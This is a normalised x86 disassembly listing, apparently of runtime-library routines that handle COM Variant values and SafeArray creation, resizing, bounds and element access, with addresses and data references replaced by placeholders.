pop edi
pop esi
pop ebx
retn
jmp [ ecx * 4 + jump_table_410ba9 ]
call sub_40e2a0
and eax 0x7f
xchg edx eax
call sub_410a64
mov [ esp ] al
jmp r-xdata
mov eax edi
call sub_40ede4
push eax
mov eax esi
call sub_40ede4
pop edx
call sub_410a64
mov [ esp ] al
jmp r-xdata
mov eax esi
call sub_40eec0
push edx
push eax
mov eax edi
call sub_40eec0
push edx
push eax
call sub_410a78
mov [ esp ] al
jmp r-xdata
mov eax esi
call sub_40f048
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_40f048
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_410ab4
mov [ esp ] al
jmp r-xdata
mov eax esi
call sub_40f184
fdiv [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_40f184
fdiv [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_410ab4
mov [ esp ] al
jmp r-xdata
mov edx edi
mov eax esi
call sub_410adc
mov [ esp ] al
jmp r-xdata
mov eax edi
call sub_40f00c
and eax 0x7f
push eax
mov eax esi
call sub_40f00c
and eax 0x7f
pop edx
call sub_410a64
mov [ esp ] al
sub_410cb8
push ebx
push esi
push ecx
mov esi eax
mov bx [ esi ]
and bx 0xfff
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_411fd4
test al al
je r-xdata
mov eax esi
call sub_410cfc
jmp r-xdata
call sub_40e2a0
mov edx esi
mov ecx 0xc
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_410cfc
push ebx
push esi
mov esi eax
mov bx [ esi ]
and bx 0xfff
cmp bx 0x14
jbe r-xdata
movzx eax bx
movzx eax [ eax + rw-data ]
cmp eax 0x8
ja r-xdata
cmp bx 0x100
jne r-xdata
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_410d3a ]
call sub_40e2a0
mov bx 0x8
jmp r-xdata
call sub_40e2a0
mov eax esi
call sub_40ede4
mov edx eax
neg edx
mov eax esi
mov ecx 0xfffffffc
call sub_40f5d4
pop esi
pop ebx
retn
mov eax esi
call sub_40eec0
neg eax
adc edx 0x0
neg edx
push edx
push eax
mov eax esi
call sub_40f684
pop esi
pop ebx
retn
mov eax esi
call sub_40f048
fchs
mov eax esi
call sub_405370
pop esi
pop ebx
retn
fild [ esi + 0x8 ]
fchs
fistp [ esi + 0x8 ]
fwait
pop esi
pop ebx
retn
fld [ esi + 0x8 ]
fchs
fstp [ esi + 0x8 ]
fwait
sub_410dc8
push ebx
push esi
push ecx
mov esi eax
mov bx [ esi ]
and bx 0xfff
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_411fd4
test al al
je r-xdata
mov eax esi
call sub_410e0c
jmp r-xdata
call sub_40e2a0
mov edx esi
mov ecx 0xd
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_410e0c
push ebx
mov ebx eax
mov ax [ ebx ]
and ax 0xfff
mov edx eax
sub dx 0x1
jb r-xdata
call sub_40e2a0
je r-xdata
pop ebx
retn
sub dx 0xa
je r-xdata
mov ax [ ebx + 0x8 ]
cmp ax 0x1
sbb eax eax
neg eax
neg al
sbb eax eax
mov [ ebx + 0x8 ] ax
pop ebx
retn
sub dx 0xf6
je r-xdata
mov eax ebx
call [ rw-data ]
mov eax ebx
call sub_410dc8
pop ebx
retn
jmp r-xdata
cmp ax 0x14
jne r-xdata
cmp ax 0x100
je r-xdata
mov eax ebx
call sub_40eec0
not eax
not edx
push edx
push eax
mov eax ebx
call sub_40f684
jmp r-xdata
mov eax ebx
call sub_40ede4
mov edx eax
not edx
mov eax ebx
mov ecx 0xfffffffc
call sub_40f5d4
jmp r-xdata
cmp ax 0x14
ja r-xdata
call sub_40e2a0
sub_410edc
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov si [ edi ]
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx esp
mov eax esi
call sub_411fd4
test al al
je r-xdata
cmp [ edi ] 0x0
je r-xdata
call sub_40e2a0
mov edx edi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov ebx eax
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov ax [ edi ]
cmp ax 0x9
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor ebx ebx
jmp r-xdata
sub_410f40
push ebx
push esi
push ecx
mov ebx eax
mov esi ebx
and si 0xfff
cmp si 0x10f
jb r-xdata
xor eax eax
jmp r-xdata
mov edx esp
mov eax esi
call sub_411fd4
test al al
jne r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_410f6c
push ebx
push esi
mov esi edx
mov ebx eax
mov ax [ ebx ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esi ] 0x0
sete al
pop esi
pop ebx
retn
mov ax [ esi ]
sub ax 0x2
jae r-xdata
cmp [ esi ] 0x1
sete al
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4053a0
sete al
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_410fc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411029
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
test ax ax
je r-xdata
mov eax esi
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_404acc
call sub_402e14
call sub_4028ac
mov ebx esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411030
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
cmp ax 0x1
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40532c
sub_411040
push ebx
mov bx [ eax ]
mov [ edx ] bx
cmp [ edx ] 0x400c
jne r-xdata
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov ebx [ eax + 0x8 ]
test [ ebx + 0x1 ] 0x20
je r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax [ eax + 0x8 ]
mov bx [ eax ]
mov [ edx ] bx
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
mov eax ebx
pop ebx
retn
sub_41108c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx edx
mov esi eax
test bl 0x1
je r-xdata
mov al 0x12
call sub_4028a0
cmp ebx 0x7f
jg r-xdata
mov ax [ ebp - 0x2 ]
call sub_41125c
test al al
jne r-xdata
inc ebx
sar ebx 0x1
jns r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
adc ebx 0x0
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call SafeArrayCreate
mov ebx eax
test ebx ebx
jne r-xdata
inc ebx
lea edx [ ebp - 0x208 ]
mov eax esi
mov eax [ ebp + 0x8 ]
call sub_40e2b0
mov ax [ ebp - 0x2 ]
or ax 0x2000
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov al 0x12
call sub_4028a0
mov ecx edx
mov esi [ eax ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x4 ]
sub esi [ ecx + 0x4 ]
inc esi
mov [ ecx ] esi
add eax 0x8
add edx 0x8
dec ebx
jne r-xdata
sub_411138
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_411040
test al al
jne r-xdata
mov eax [ esp + 0xc ]
movzx edx [ eax ]
mov edx [ eax + edx * 8 + 0xc ]
mov [ esp + 0x4 ] edx
sub esi edx
inc esi
mov [ esp ] esi
push esp
mov eax [ esp + 0x10 ]
push eax
call SafeArrayRedim
test eax eax
je r-xdata
mov al 0x13
call sub_4028a0
add esp 0x10
pop esi
pop ebx
retn
mov al 0x12
call sub_4028a0
sub_41118c
push ebx
add esp 0xfffffff8
mov ebx eax
mov ecx esp
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_411040
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov al 0x13
call sub_4028a0
sub_4111b4
push ebx
add esp 0xfffffff8
mov ebx eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_411040
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_4111dc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_41118c
push eax
call SafeArrayGetLBound
test eax eax
je r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov al 0x14
call sub_4028a0
sub_411204
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_41118c
push eax
call SafeArrayGetUBound
test eax eax
je r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov al 0x14
call sub_4028a0
sub_411234
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_411040
pop ecx
pop edx
retn
sub_41125c
and ax 0xfff
mov edx eax
sub dx 0x16
jae r-xdata
xor eax eax
retn
movzx eax ax
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_411280
push ebx
mov ebx eax
and bx 0xfff
mov eax ebx
sub ax 0x16
jae r-xdata
mov eax ebx
call sub_410f40
test al al
jne r-xdata
movzx eax bx
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 + 0x1 ] 0x0
jne r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4112b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0xc ]
call sub_411040
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov al 0x13
call sub_4028a0
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_41137d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov al 0x14
call sub_4028a0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayGetElement
test eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
test eax eax
je r-xdata
mov [ ebp - 0x10 ] bx
mov al 0x14
call sub_4028a0
mov eax [ ebp - 0x1c ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40e6dc
jmp r-xdata
mov al 0x14
call sub_4028a0
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_40e6dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411384
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
sub_41138c
push ebp
mov ebp esp
push ebx
mov ebx ecx
inc ebx
jle r-xdata
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4112b8
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ edx + ecx * 4 ]
dec ecx
jns r-xdata
sub_4113b0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0x8 ]
call sub_411040
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1a ]
mov eax esi
call sub_411040
test al al
jne r-xdata
mov al 0x13
call sub_4028a0
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_411280
test al al
jne r-xdata
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov al 0x14
call sub_4028a0
cmp [ ebp - 0x1a ] 0x100
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_4114ea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xc
jne r-xdata
cmp [ ebp - 0x1a ] 0x100
jne r-xdata
mov al 0xf
call sub_4028a0
mov edx esi
lea eax [ ebp - 0x10 ]
mov ecx ebx
call sub_40ec60
add ebx 0xfffffff8
sub ebx 0x2
jb r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call j_sub_40ec38
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
test eax eax
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_410f40
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
sub ebx 0x3
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPutElement
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_4052fc
jmp r-xdata
mov al 0x14
call sub_4028a0
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
mov al 0x14
call sub_4028a0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4114f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
mov ebx [ ebp + 0x8 ]
inc ebx
push ebx
push edx
push eax
call sub_4113b0
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ ecx + ebx * 4 ]
dec ebx
jns r-xdata
sub_411520
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi [ ebp + 0x8 ]
mov ebp eax
xor ebx ebx
test ecx ecx
jge r-xdata
xor eax eax
mov al [ edi + 0x1 ]
add edi eax
mov eax [ esi + ebx * 4 ]
mul [ edi + 0x2 ]
mov edi [ edi + 0x6 ]
test edi edi
je r-xdata
mov ebp [ ebp ]
add ebp eax
inc ebx
cmp ebx ecx
jle r-xdata
mov edi [ edi ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41159c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] 0x1
mov ebx eax
mov eax edx
call sub_41157c
dec eax
test eax eax
jle r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] eax
dec [ esp + 0x4 ]
jne r-xdata
mov eax ebx
call sub_411594
mov esi eax
mov eax [ ebx ]
call sub_411594
mov ebp eax
dec esi
test esi esi
jle r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx ]
mov edi 0x1
inc edi
dec esi
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov eax [ ebx + edi * 4 ]
call sub_411594
cmp ebp eax
je r-xdata
sub_411604
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
call sub_41157c
mov esi eax
push esi
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405994
add esp 0x4
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_411594
dec eax
mov edx [ ebp ]
mov [ edx + edi * 4 ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
sub_411658
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ edi ]
call sub_4057e0
mov edx eax
test edx edx
jl r-xdata
test bl bl
je r-xdata
inc edx
xor eax eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_4057e0
cmp eax 0x0
jl r-xdata
inc eax
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 ] edx
dec eax
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
sub_4116c4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi eax
mov eax edx
call sub_41157c
mov ebp eax
mov eax ebp
add eax eax
push eax
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405994
add esp 0x4
xor ebx ebx
jmp r-xdata
mov eax ebp
add eax eax
cmp ebx eax
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + ebx * 4 ] edx
inc ebx
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov eax esi
call sub_411594
dec eax
mov edx [ edi ]
mov [ edx + ebx * 4 ] eax
mov esi [ esi ]
sub_41171c
mov edx 0x1
test eax eax
je r-xdata
cmp edx 0x48
jne r-xdata
cmp [ eax ] 0x11
jne r-xdata
mov eax edx
retn
mov edx 0x100
xor edx edx
mov dl [ eax + 0x1 ]
add eax edx
mov edx [ eax + 0xa ]
sub_411744
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_411a49
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_405ab4
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_405ab4
mov eax [ ebp - 0x4 ]
call sub_4052f4
mov eax edi
call sub_41171c
mov ebx eax
cmp ebx 0x1
jle r-xdata
cmp ebx 0x100
jne r-xdata
cmp ebx 0x11
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411a50
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404f0c
lea eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404f0c
retn
cmp ebx 0x100
jne r-xdata
mov esi ebx
mov esi 0x8
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4116c4
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_411604
lea ecx [ ebp - 0x14 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x10 ]
call sub_4059a0
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4057e0
mov edx eax
mov ecx esi
mov eax [ ebp - 0xc ]
call sub_41108c
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4052fc
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_41159c
test al al
je r-xdata
mov eax edi
call sub_41157c
dec eax
jle r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_411658
test al al
jne r-xdata
mov eax ebx
cmp eax 0xa
jg r-xdata
push edi
mov eax [ ebp - 0x14 ]
call sub_4057e0
mov ecx eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_411520
mov esi eax
test esi esi
je r-xdata
cmp eax 0x11
jg r-xdata
je r-xdata
sub eax 0x12
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
mov cl 0xfc
call sub_40534c
jmp r-xdata
cmp eax 0x9
ja r-xdata
lea eax [ ebp - 0x28 ]
movzx edx [ esi ]
mov cl 0x2
call sub_40534c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
xor edx edx
mov dl [ esi ]
mov cl 0x1
call sub_40534c
jmp r-xdata
sub eax 0xb
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4057e0
push eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
call sub_4114f8
lea eax [ ebp - 0x28 ]
call sub_4052f4
jmp [ eax * 4 + jump_table_41186c ]
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
mov cl 0x4
call sub_40534c
jmp r-xdata
sub eax 0xed
je r-xdata
lea eax [ ebp - 0x28 ]
mov dx [ esi ]
neg dx
sbb edx edx
neg edx
call sub_405368
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ esi ]
mov cl 0xfe
call sub_40534c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
mov cl 0xfc
call sub_40534c
jmp r-xdata
fld [ esi ]
lea eax [ ebp - 0x28 ]
call sub_405370
jmp r-xdata
fld [ esi ]
lea eax [ ebp - 0x28 ]
call sub_405370
jmp r-xdata
fild [ esi ]
lea eax [ ebp - 0x28 ]
call sub_405378
jmp r-xdata
fld [ esi ]
lea eax [ ebp - 0x28 ]
call sub_405370
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
call sub_405388
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
call sub_405398
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
call sub_405380
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx esi
call sub_4052fc
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
call sub_405390
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ esi ]
mov cl 0xff
call sub_40534c
jmp r-xdata
jmp r-xdata
sub_411a58
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_411d01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4111b4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_402744
mov [ ebp - 0x10 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
mov edx ebx
call sub_405808
mov eax ebx
call sub_41157c
mov eax ebx
call sub_41171c
mov ebx eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_411604
lea ecx [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x14 ]
call sub_4059a0
inc edi
xor ebx ebx
cmp eax 0x11
jg r-xdata
je r-xdata
lea edx [ ebx + 0x1 ]
mov eax esi
call sub_411204
push eax
lea edx [ ebx + 0x1 ]
mov eax esi
call sub_4111dc
pop edx
sub edx eax
inc edx
mov eax [ ebp - 0x10 ]
mov [ eax + ebx * 4 ] edx
inc ebx
dec edi
jne r-xdata
sub eax 0x12
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] eax
jmp r-xdata
cmp eax 0x9
ja r-xdata
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] ax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] al
jmp r-xdata
sub eax 0xb
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_411658
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_411b62 ]
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] eax
jmp r-xdata
sub eax 0xed
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_405314
mov [ edi ] ax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4057e0
mov ecx eax
mov eax esi
mov edx [ ebp - 0x18 ]
call sub_41138c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4057e0
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_411520
mov edi eax
mov eax ebx
cmp eax 0xa
jg r-xdata
mov eax [ ebp - 0x10 ]
call sub_402764
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d08
lea eax [ ebp - 0x28 ]
call sub_4053ac
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404f0c
retn
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] ax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_40531c
fstp [ edi ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_40531c
fstp [ edi ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_405324
fistp [ edi ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_40531c
fstp [ edi ]
fwait
jmp r-xdata
mov eax edi
lea edx [ ebp - 0x28 ]
call sub_405334
jmp r-xdata
mov eax edi
lea edx [ ebp - 0x28 ]
call sub_405344
jmp r-xdata
mov eax edi
lea edx [ ebp - 0x28 ]
call sub_40532c
jmp r-xdata
mov eax edi
lea edx [ ebp - 0x28 ]
call sub_4052fc
jmp r-xdata
dec eax
je r-xdata
mov eax edi
lea edx [ ebp - 0x28 ]
call sub_40533c
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_405304
mov [ edi ] al
jmp r-xdata
jmp r-xdata
sub_411d34
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
mov eax [ rw-data ]
call sub_40d7e4
xor edx edx
push ebp
push sub_411d97
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_4057d8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d9e
mov eax [ rw-data ]
call sub_40d8e4
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ esi ]
call sub_4036c0
sub_411db0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_411fd4
test al al
je r-xdata
mov eax ebx
call sub_411f54
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_411de8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_411f54
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_411fd4
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_411e3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
